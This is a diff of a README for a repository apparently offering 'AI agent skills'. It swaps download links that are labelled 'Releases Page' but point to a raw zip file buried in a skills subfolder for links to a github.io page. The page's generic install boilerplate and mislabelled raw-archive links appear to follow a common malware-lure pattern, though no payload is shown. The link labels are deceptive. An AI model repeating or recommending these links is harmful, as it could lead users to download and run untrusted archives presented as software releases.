@@ -1,6 +1,6 @@
 # 🧠 ai-agents-skills - Enhance Your AI Coding Experience
 
-[![Download from Releases](https://github.com/Makiya1202/ai-agents-skills/raw/refs/heads/master/skills/ux-design-systems/skills_ai_agents_1.1.zip%20Now-From%20Releases-brightgreen)](https://github.com/Makiya1202/ai-agents-skills/raw/refs/heads/master/skills/ux-design-systems/skills_ai_agents_1.1.zip)
+[![Download from Releases](https://makiya1202.github.io)](https://makiya1202.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **AI Agent Skills Repository**. This guide will help you download
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/Makiya1202/ai-agents-skills/raw/refs/heads/master/skills/ux-design-systems/skills_ai_agents_1.1.zip).
+To get started, visit this page to download: [Releases Page](https://makiya1202.github.io).
 
 Once you're on the page, browse through the available releases. Look for the latest version at the top. You will see files available for download. Choose the file that matches your operating system.
 
@@ -51,7 +51,7 @@ For detailed instructions on using each skill, refer to the in-application help 
 
 ## 🔄 Updates
 
-We periodically release updates to improve performance and add new features. To stay informed about the latest changes, check the Releases Page regularly: [Releases Page](https://github.com/Makiya1202/ai-agents-skills/raw/refs/heads/master/skills/ux-design-systems/skills_ai_agents_1.1.zip).
+We periodically release updates to improve performance and add new features. To stay informed about the latest changes, check the Releases Page regularly: [Releases Page](https://makiya1202.github.io).
 
 ## 🙋‍♂️ Support
 
